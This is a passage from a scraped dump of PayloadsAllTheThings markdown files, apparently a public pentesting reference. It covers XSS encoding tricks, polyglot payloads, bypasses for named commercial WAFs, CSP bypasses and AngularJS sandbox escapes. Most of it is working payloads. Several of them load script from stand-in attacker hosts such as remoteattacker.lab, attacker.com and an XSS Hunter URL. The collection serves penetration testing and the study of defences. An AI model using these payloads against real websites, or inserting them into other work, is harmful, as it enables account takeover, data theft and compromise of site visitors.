encoding\n\n```javascript\njavascript:'\\74\\163\\166\\147\\40\\157\\156\\154\\157\\141\\144\\75\\141\\154\\145\\162\\164\\50\\61\\51\\76'\n```\n\n## Bypass using Unicode\n\nThis payload takes advantage of Unicode escape sequences to obscure the JavaScript function\n\n```html\n<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>\n```\n\nIt uses Unicode escape sequences to represent characters.\n\n| Unicode  | ASCII     |\n| -------- | --------- |\n| `\\u0061` | a         |\n| `\\u006C` | l         |\n| `\\u0065` | e         |\n| `\\u0072` | r         |\n| `\\u0074` | t         |\n\nSame thing with these Unicode characters.\n\n| Unicode (UTF-8 encoded) | Unicode Name                 | ASCII | ASCII Name     |\n| ----------------------- | ---------------------------- | ----- | ---------------|\n| `\\uFF1C` (%EF%BC%9C)    | FULLWIDTH LESS­THAN SIGN      | <     | LESS­THAN       |\n| `\\uFF1E` (%EF%BC%9E)    | FULLWIDTH GREATER­THAN SIGN   | >     | GREATER­THAN    |\n| `\\u02BA` (%CA%BA)       | MODIFIER LETTER DOUBLE PRIME | \"     | QUOTATION MARK |\n| `\\u02B9` (%CA%B9)       | MODIFIER LETTER PRIME        | '     | APOSTROPHE     |\n\nAn example payload could be `ʺ＞＜svg onload=alert(/XSS/)＞/`, which would look like that after being URL encoded:\n\n```javascript\n%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/\n```\n\nWhen Unicode characters are converted to another case, they might bypass a filter look for specific keywords.\n\n| Unicode  | Transform | Character |\n| -------- | --------- | --------- |\n| `İ` (%c4%b0) | `toLowerCase()` | i |\n| `ı` (%c4%b1) | `toUpperCase()` | I |\n| `ſ` (%c5%bf) | `toUpperCase()` | S |\n| `K` (%E2%84) | `toLowerCase()` | k |\n\nThe following payloads become valid HTML tags after being converted.\n\n```html\n<ſvg onload=... >\n<ıframe id=x onload=>\n```\n\n## Bypass using UTF-7\n\n```javascript\n+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-\n```\n\n## Bypass using UTF-8\n\n```javascript\n< = %C0%BC = %E0%80%BC = %F0%80%80%BC\n> = %C0%BE = %E0%80%BE = %F0%80%80%BE\n' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7\n\" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2\n\" = %CA%BA\n' = %CA%B9\n```\n\n## Bypass using UTF-16be\n\n```javascript\n%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00\n\\x00<\\x00s\\x00v\\x00g\\x00/\\x00o\\x00n\\x00l\\x00o\\x00a\\x00d\\x00=\\x00a\\x00l\\x00e\\x00r\\x00t\\x00(\\x00)\\x00>\n```\n\n## Bypass using UTF-32\n\n```js\n%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E\n```\n\n## Bypass using BOM\n\nByte Order Mark (The page must begin with the BOM character.)\nBOM character allows you to override charset of the page\n\n```js\nBOM Character for UTF-16 Encoding:\nBig Endian : 0xFE 0xFF\nLittle Endian : 0xFF 0xFE\nXSS : %fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E\n\nBOM Character for UTF-32 Encoding:\nBig Endian : 0x00 0x00 0xFE 0xFF\nLittle Endian : 0xFF 0xFE 0x00 0x00\nXSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E\n```\n\n## Bypass using JSfuck\n\nBypass using [jsfuck](http://www.jsfuck.com/)\n\n```javascript\nn```\n\n## References\n\n- [Airbnb – When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities - Brett Buerhaus (@bbuerhaus) - March 8, 2017](https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/)\n", "timestamp": "2025-10-21T13:30:26.635374"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "XSS Injection/2 - XSS Polyglot.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/2%20-%20XSS%20Polyglot.md", "content": "# Polyglot XSS\n\nA polyglot XSS is a type of cross-site scripting (XSS) payload designed to work across multiple contexts within a web application, such as HTML, JavaScript, and attributes. It exploits the application’s inability to properly sanitize input in different parsing scenarios.\n\n* Polyglot XSS - 0xsobky\n\n    ```javascript\n    jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n    ```\n\n* Polyglot XSS - Ashar Javed\n\n    ```javascript\n    \">><marquee><img src=x onerror=confirm(1)></marquee>\" ></plaintext\\></|\\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\" ></script><script>alert(1)</script>\"><img/id=\"confirm&lpar; 1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'\"><img src=\"http: //i.imgur.com/P8mL8.jpg\">\n    ```\n\n* Polyglot XSS - Mathias Karlsson\n\n    ```javascript\n    \" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//\n    ```\n\n* Polyglot XSS - Rsnake\n\n    ```javascript\n    ';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//\";alert(String.fromCharCode (88,83,83))//\";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>\n    ```\n\n* Polyglot XSS - Daniel Miessler\n\n    ```javascript\n    ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>\n    “ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//\n    '\">><marquee><img src=x onerror=confirm(1)></marquee>\"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\"></script><script>alert(1)</script>\"><img/id=\"confirm&lpar;1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'\"><img src=\"http://i.imgur.com/P8mL8.jpg\">\n    javascript://'/</title></style></textarea></script>--><p\" onclick=alert()//>*/alert()/*\n    javascript://--></script></title></style>\"/</textarea>*/<alert()/*' onclick=alert()//>a\n    javascript://</title>\"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/\n    javascript://</title></style></textarea>--></script><a\"//' onclick=alert()//>*/alert()/*\n    javascript://'//\" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*\n    javascript://</title></textarea></style></script --><li '//\" '*/alert()/*', onclick=alert()//\n    javascript:alert()//--></script></textarea></style></title><a\"//' onclick=alert()//>*/alert()/*\n    --></script></title></style>\"/</textarea><a' onclick=alert()//>*/alert()/*\n    /</title/'/</style/</script/</textarea/--><p\" onclick=alert()//>*/alert()/*\n    javascript://--></title></style></textarea></script><svg \"//' onclick=alert()//\n    /</title/'/</style/</script/--><p\" onclick=alert()//>*/alert()/*\n    ```\n\n* Polyglot XSS - [@s0md3v](https://twitter.com/s0md3v/status/966175714302144514)\n    ![https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg](https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg)\n\n    ```javascript\n    -->'\"/></sCript><svG x=\">\" onload=(co\\u006efirm)``>\n    ```\n\n    ![https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large](https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large)\n\n    ```javascript\n    <svg%0Ao%00nload=%09((pro\\u006dpt))()//\n    ```\n\n* Polyglot XSS - from [@filedescriptor's Polyglot Challenge](https://web.archive.org/web/20190617111911/https://polyglot.innerht.ml/)\n\n    ```javascript\n    // Author: crlf\n    javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\\" onmouseover=/*&lt;svg/*/onload=alert()//>\n\n    // Author: europa\n    javascript:\"/*'/*`/*\\\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>\n\n    // Author: EdOverflow\n    javascript:\"/*\\\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>\n\n    // Author: h1/ragnar\n    javascript:`//\"//\\\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`\n    ```\n\n* Polyglot XSS - from [brutelogic](https://brutelogic.com.br/blog/building-xss-polyglots/)\n\n    ```javascript\n    JavaScript://%250Aalert?.(1)//'/*\\'/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\\76-->\n    ```\n\n## References\n\n* [Building XSS Polyglots - Brute - June 23, 2021](https://brutelogic.com.br/blog/building-xss-polyglots/)\n* [XSS Polyglot Challenge v2 - @filedescriptor - August 20, 2015](https://web.archive.org/web/20190617111911/https://polyglot.innerht.ml/)\n", "timestamp": "2025-10-21T13:30:26.731335"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "XSS Injection/3 - XSS Common WAF Bypass.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/3%20-%20XSS%20Common%20WAF%20Bypass.md", "content": "# Common WAF Bypass\n\n> WAFs are designed to filter out malicious content by inspecting incoming and outgoing traffic for patterns indicative of attacks. Despite their sophistication, WAFs often struggle to keep up with the diverse methods attackers use to obfuscate and modify their payloads to circumvent detection.\n\n## Summary\n\n* [Cloudflare](#cloudflare)\n* [Chrome Auditor](#chrome-auditor)\n* [Incapsula WAF](#incapsula-waf)\n* [Akamai WAF](#akamai-waf)\n* [WordFence WAF](#wordfence-waf)\n* [Fortiweb WAF](#fortiweb-waf)\n\n## Cloudflare\n\n* 25st January 2021 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)\n\n    ```js\n    <svg/onrandom=random onload=confirm(1)>\n    <video onnull=null onmouseover=confirm(1)>\n    ```\n\n* 21st April 2020 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)\n\n    ```js\n    <svg/OnLoad=\"`${prompt``}`\">\n    ```\n\n* 22nd August 2019 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)\n\n    ```js\n    <svg/onload=%26nbsp;alert`bohdan`+\n    ```\n\n* 5th June 2019 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)\n\n    ```js\n    1'\"><img/src/onerror=.1|alert``>\n    ```\n\n* 3rd June 2019 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)\n\n    ```js\n    <svg onload=prompt%26%230000000040document.domain)>\n    <svg onload=prompt%26%23x000000028;document.domain)>\n    xss'\"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>\n    ```\n\n* 22nd March 2019 - @RakeshMane10\n\n    ```js\n    <svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f\n    ```\n\n* 27th February 2018\n\n    ```html\n    <a href=\"j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;\">X</a>\n    ```\n\n## Chrome Auditor\n\nNOTE: Chrome Auditor is deprecated and removed on latest version of Chrome and Chromium Browser.\n\n* 9th August 2018\n\n    ```javascript\n    </script><svg><script>alert(1)-%26apos%3B\n    ```\n\n## Incapsula WAF\n\n* 11th May 2019 - [@daveysec](https://twitter.com/daveysec/status/1126999990658670593)\n\n    ```js\n    <svg onload\\r\\n=$.globalEval(\"al\"+\"ert()\");>\n    ```\n\n* 8th March 2018 - [@Alra3ees](https://twitter.com/Alra3ees/status/971847839931338752)\n\n    ```javascript\n    anythinglr00</script><script>alert(document.domain)</script>uxldz\n    anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz\n    ```\n\n* 11th September 2018 - [@c0d3G33k](https://twitter.com/c0d3G33k)\n\n    ```javascript\n    <object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>\n    ```\n\n## Akamai WAF\n\n* 18th June 2018 - [@zseano](https://twitter.com/zseano)\n\n    ```javascript\n    ?\"></script><base%20c%3D=href%3Dhttps:\\mysite>\n    ```\n\n* 28th October 2018 - [@s0md3v](https://twitter.com/s0md3v/status/1056447131362324480)\n\n    ```svg\n    <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>\n    ```\n\n## WordFence WAF\n\n* 12th September 2018 - [@brutelogic](https://twitter.com/brutelogic)\n\n    ```html\n    <a href=javas&#99;ript:alert(1)>\n    ```\n\n## Fortiweb WAF\n\n* 9th July 2019 - [@rezaduty](https://twitter.com/rezaduty)\n\n    ```javascript\n    \\u003e\\u003c\\u0068\\u0031 onclick=alert('1')\\u003e\n    ```\n", "timestamp": "2025-10-21T13:30:26.851501"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "XSS Injection/4 - CSP Bypass.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/4%20-%20CSP%20Bypass.md", "content": "# CSP Bypass\n\n> A Content Security Policy (CSP) is a security feature that helps prevent cross-site scripting (XSS), data injection attacks, and other code-injection vulnerabilities in web applications. It works by specifying which sources of content (like scripts, styles, images, etc.) are allowed to load and execute on a webpage.\n\n## Summary\n\n- [Tools](#tools)\n- [Bypass CSP using JSONP](#bypass-csp-using-jsonp)\n- [Bypass CSP default-src](#bypass-csp-default-src)\n- [Bypass CSP inline eval](#bypass-csp-inline-eval)\n- [Bypass CSP unsafe-inline](#bypass-csp-unsafe-inline)\n- [Bypass CSP script-src self](#bypass-csp-script-src-self)\n- [Bypass CSP script-src data](#bypass-csp-script-src-data)\n- [Bypass CSP nonce](#bypass-csp-nonce)\n- [Bypass CSP header sent by PHP](#bypass-csp-header-sent-by-php)\n- [Labs](#labs)\n- [References](#references)\n\n## Tools\n\n- [gmsgadget.com](https://gmsgadget.com/) - GMSGadget (Give Me a Script Gadget) is a collection of JavaScript gadgets that can be used to bypass XSS mitigations such as Content Security Policy (CSP) and HTML sanitizers like DOMPurify.\n- [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) - CSP Evaluator allows developers and security experts to check if a Content Security Policy (CSP) serves as a strong mitigation against cross-site scripting attacks.\n\n## Bypass CSP using JSONP\n\n**Requirements**:\n\n- CSP: `script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';`\n\n**Payload**:\n\nUse a callback function from a whitelisted source listed in the CSP.\n\n- Google Search: `//google.com/complete/search?client=chrome&jsonp=alert(1);`\n- Google Account: `https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)`\n- Google Translate: `https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();`\n- Youtube: `https://www.youtube.com/oembed?callback=alert;`\n- [Intruders/jsonp_endpoint.txt](Intruders/jsonp_endpoint.txt)\n- [JSONBee/jsonp.txt](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)\n\n```js\n<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>\"\n```\n\n## Bypass CSP default-src\n\n**Requirements**:\n\n- CSP like `Content-Security-Policy: default-src 'self' 'unsafe-inline';`,\n\n**Payload**:\n\n`http://example.lab/csp.php?xss=f=document.createElement%28\"iframe\"%29;f.id=\"pwn\";f.src=\"/robots.txt\";f.onload=%28%29=>%7Bx=document.createElement%28%27script%27%29;x.src=%27//remoteattacker.lab/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;`\n\n```js\nscript=document.createElement('script');\nscript.src='//remoteattacker.lab/csp.js';\nwindow.frames[0].document.head.appendChild(script);\n```\n\nSource: [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa)\n\n## Bypass CSP inline eval\n\n**Requirements**:\n\n- CSP `inline` or `eval`\n\n**Payload**:\n\n```js\nd=document;f=d.createElement(\"iframe\");f.src=d.querySelector('link[href*=\".css\"]').href;d.body.append(f);s=d.createElement(\"script\");s.src=\"https://[YOUR_XSSHUNTER_USERNAME].xss.ht\";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)\n```\n\nSource: [Rhynorater](https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f)\n\n## Bypass CSP script-src self\n\n**Requirements**:\n\n- CSP like `script-src self`\n\n**Payload**:\n\n```js\n<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>\n```\n\nSource: [@akita_zen](https://twitter.com/akita_zen)\n\n## Bypass CSP script-src data\n\n**Requirements**:\n\n- CSP like `script-src 'self' data:` as warned about in the official [mozilla documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src).\n\n**Payload**:\n\n```javascript\n<script src=\"data:,alert(1)\">/</script>\n```\n\nSource: [@404death](https://twitter.com/404death/status/1191222237782659072)\n\n## Bypass CSP unsafe-inline\n\n**Requirements**:\n\n- CSP: `script-src https://google.com 'unsafe-inline';`\n\n**Payload**:\n\n```javascript\n\"/><script>alert(1);</script>\n```\n\n## Bypass CSP nonce\n\n**Requirements**:\n\n- CSP like `script-src 'nonce-RANDOM_NONCE'`\n- Imported JS file with a relative link: `<script src='/PATH.js'></script>`\n\n**Payload**:\n\n- Inject a base tag.\n\n  ```html\n  <base href=http://www.attacker.com>\n  ```\n\n- Host your custom js file at the same path that one of the website's script.\n\n  ```ps1\n  http://www.attacker.com/PATH.js\n  ```\n\n## Bypass CSP header sent by PHP\n\n**Requirements**:\n\n- CSP sent by PHP `header()` function\n\n**Payload**:\n\nIn default `php:apache` image configuration, PHP cannot modify headers when the response's data has already been written. This event occurs when a warning is raised by PHP engine.\n\nHere are several ways to generate a warning:\n\n- 1000 $_GET parameters\n- 1000 $_POST parameters\n- 20 $_FILES\n\nIf the **Warning** are configured to be displayed you should get these:\n\n- **Warning**: `PHP Request Startup: Input variables exceeded 1000. To increase the limit change max_input_vars in php.ini. in Unknown on line 0`\n- **Warning**: `Cannot modify header information - headers already sent in /var/www/html/index.php on line 2`\n\n```ps1\nGET /?xss=<script>alert(1)</script>&a&a&a&a&a&a&a&a...[REPEATED &a 1000 times]&a&a&a&a\n```\n\nSource: [@pilvar222](https://twitter.com/pilvar222/status/1784618120902005070)\n\n## Labs\n\n- [Root Me - CSP Bypass - Inline Code](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Inline-code)\n- [Root Me - CSP Bypass - Nonce](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Nonce)\n- [Root Me - CSP Bypass - Nonce 2](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Nonce-2)\n- [Root Me - CSP Bypass - Dangling Markup](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Dangling-markup)\n- [Root Me - CSP Bypass - Dangling Markup 2](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Dangling-markup-2)\n- [Root Me - CSP Bypass - JSONP](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-JSONP)\n\n## References\n\n- [Airbnb – When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities - Brett Buerhaus (@bbuerhaus) - March 8, 2017](https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/)\n- [D1T1 - So We Broke All CSPs - Michele Spagnuolo and Lukas Weichselbaum - June 27, 2017](http://web.archive.org/web/20170627043828/https://conference.hitb.org/hitbsecconf2017ams/materials/D1T1%20-%20Michele%20Spagnuolo%20and%20Lukas%20Wilschelbaum%20-%20So%20We%20Broke%20All%20CSPS.pdf)\n- [How to use Google’s CSP Evaluator to bypass CSP - Thomas Orlita - September 9, 2018](https://websecblog.com/vulns/google-csp-evaluator/)\n- [Making an XSS triggered by CSP bypass on Twitter - wiki.ioin.in(查看原文) - April 6, 2020](https://www.buaq.net/go-25883.html)\n", "timestamp": "2025-10-21T13:30:26.953683"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "XSS Injection/5 - XSS in Angular.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/5%20-%20XSS%20in%20Angular.md", "content": "# XSS in Angular and AngularJS\n\n## Summary\n\n* [Client Side Template Injection](#client-side-template-injection)\n    * [Stored/Reflected XSS](#storedreflected-xss)\n    * [Advanced Bypassing XSS](#advanced-bypassing-xss)\n    * [Blind XSS](#blind-xss)\n* [Automatic Sanitization](#automatic-sanitization)\n* [References](#references)\n\n## Client Side Template Injection\n\nThe following payloads are based on Client Side Template Injection.\n\n### Stored/Reflected XSS\n\n`ng-app` directive must be present in a root element to allow the client-side injection (cf. [AngularJS: API: ngApp](https://docs.angularjs.org/api/ng/directive/ngApp)).\n\n> AngularJS as of version 1.6 have removed the sandbox altogether\n\nAngularJS 1.6+ by [Mario Heiderich](https://twitter.com/cure53berlin)\n\n```javascript\n{{constructor.constructor('alert(1)')()}}\n```\n\nAngularJS 1.6+ by [@brutelogic](https://twitter.com/brutelogic/status/1031534746084491265)\n\n```javascript\n{{[].pop.constructor&#40'alert\\u00281\\u0029'&#41&#40&#41}}\n```\n\nExample available at [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?a=<brute+ng-app>%7B%7B[].pop.constructor%26%2340%27alert%5Cu00281%5Cu0029%27%26%2341%26%2340%26%2341%7D%7D)\n\nAngularJS 1.6.0 by [@LewisArdern](https://twitter.com/LewisArdern/status/1055887619618471938) & [@garethheyes](https://twitter.com/garethheyes/status/1055884215131213830)\n\n```javascript\n{{0[a='constructor'][a]('alert(1)')()}}\n{{$eval.constructor('alert(1)')()}}\n{{$on.constructor('alert(1)')()}}\n```\n\nAngularJS 1.5.9 - 1.5.11 by [Jan Horn](https://twitter.com/tehjh)\n\n```javascript\n{{\n    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;\n    c.$apply=$apply;c.$eval=b;op=$root.$$phase;\n    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;\n    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;\n    B=C(b,c,b);$evalAsync(\"\n    astNode=pop();astNode.type='UnaryExpression';\n    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';\n    astNode.argument={type:'Identifier',name:'foo'};\n    \");\n    m1=B($$asyncQueue.pop().expression,null,$root);\n    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;\n    $eval('a(b.c)');[].push.apply=a;\n}}\n```\n\nAngularJS 1.5.0 - 1.5.8\n\n```javascript\n{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}\n```\n\nAngularJS 1.4.0 - 1.4.9\n\n```javascript\n{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}\n```\n\nAngularJS 1.3.20\n\n```javascript\n{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}\n```\n\nAngularJS 1.3.19\n\n```javascript\n{{\n    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;\n    $eval('x=alert(1)//');\n}}\n```\n\nAngularJS 1.3.3 - 1.3.18\n\n```javascript\n{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;\n  'a'.constructor.prototype.charAt=[].join;\n  $eval('x=alert(1)//');  }}\n```\n\nAngularJS 1.3.1 - 1.3.2\n\n```javascript\n{{\n    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;\n    'a'.constructor.prototype.charAt=''.valueOf;\n    $eval('x=alert(1)//');\n}}\n```\n\nAngularJS 1.3.0\n\n```javascript\n{{!ready && (ready = true) && (\n      !call\n      ? $$watchers[0].get(toString.constructor.prototype)\n      : (a = apply) &&\n        (apply = constructor) &&\n        (valueOf = call) &&\n        (''+''.toString(\n          'F = Function.prototype;' +\n          'F.apply = F.a;' +\n          'delete F.a;' +\n          'delete F.valueOf;' +\n          'alert(1);'\n        ))\n    );}}\n```\n\nAngularJS 1.2.24 - 1.2.29\n\n```javascript\n{{'a'.constructor.prototype.charAt=''.valueOf;$eval(\"x='\\\"+(y='if(!window\\\\u002ex)alert(window\\\\u002ex=1)')+eval(y)+\\\"'\");}}\n```\n\nAngularJS 1.2.19 - 1.2.23\n\n```javascript\n{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor);}}\n```\n\nAngularJS 1.2.6 - 1.2.18\n\n```javascript\n{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}\n```\n\nAngularJS 1.2.2 - 1.2.5\n\n```javascript\n{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval(\"x='\"+(y='if(!window\\\\u002ex)alert(window\\\\u002ex=1)')+eval(y)+\"'\");}}\n```\n\nAngularJS 1.2.0 - 1.2.1\n\n```javascript\n{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}\n```\n\nAngularJS 1.0.1 - 1.1.5 and Vue JS\n\n```javascript\n{{constructor.constructor('alert(1)')()}}\n```\n\n### Advanced Bypassing XSS\n\nAngularJS (without `'` single and `\"` double quotes) by [@Viren](https://twitter.com/VirenPawar_)\n\n```javascript\n{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}\n```\n\nAngularJS (without `'` single and `\"` double quotes and `constructor` string)\n\n```javascript\n{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}\n```\n\n```javascript\n{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}\n```\n\n```javascript\n{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}\n```\n\n```javascript\n{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}\n```\n\nAngularJS bypass Waf [Imperva]\n\n```javascript\n{{x=['constr', 'uctor'];a=x.join('');b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'pr\\\\u{6f}mpt(d\\\\u{6f}cument.d\\\\u{6f}main)')()}}\n```\n\n### Blind XSS\n\n1.0.1 - 1.1.5 && > 1.6.0 by Mario Heiderich (Cure53)\n\n```javascript\n{{\n    constructor.constructor(\"var _ = document.createElement('script');\n    _.src='//localhost/m';\n    document.getElementsByTagName('body')[0].appendChild(_)\")()\n}}\n```\n\nShorter 1.0.1 - 1.1.5 && > 1.6.0 by Lewis Ardern (Synopsys) and Gareth Heyes (PortSwigger)\n\n```javascript\n{{\n    $on.constructor(\"var _ = document.createElement('script');\n    _.src='//localhost/m';\n    document.getElementsByTagName('body')[0].appendChild(_)\")()\n}}\n```\n\n1.2.0 - 1.2.5 by Gareth Heyes (PortSwigger)\n\n```javascript\n{{\n    a=\"a\"[\"constructor\"].prototype;a.charAt=a.trim;\n    $eval('a\",eval(`var _=document\\\\x2ecreateElement(\\'script\\');\n    _\\\\x2esrc=\\'//localhost/m\\';\n    document\\\\x2ebody\\\\x2eappendChild(_);`),\"')\n}}\n```\n\n1.2.6 - 1.2.18 by Jan Horn (Cure53, now works at Google Project Zero)\n\n```javascript\n{{\n    (_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'eval(\"\n        var _ = document.createElement(\\'script\\');\n        _.src=\\'//localhost/m\\';\n        document.getElementsByTagName(\\'body\\')[0].appendChild(_)\")')()\n}}\n```\n\n1.2.19 (FireFox) by Mathias Karlsson\n\n```javascript\n{{\n    toString.constructor.prototype.toString=toString.constructor.prototype.call;\n    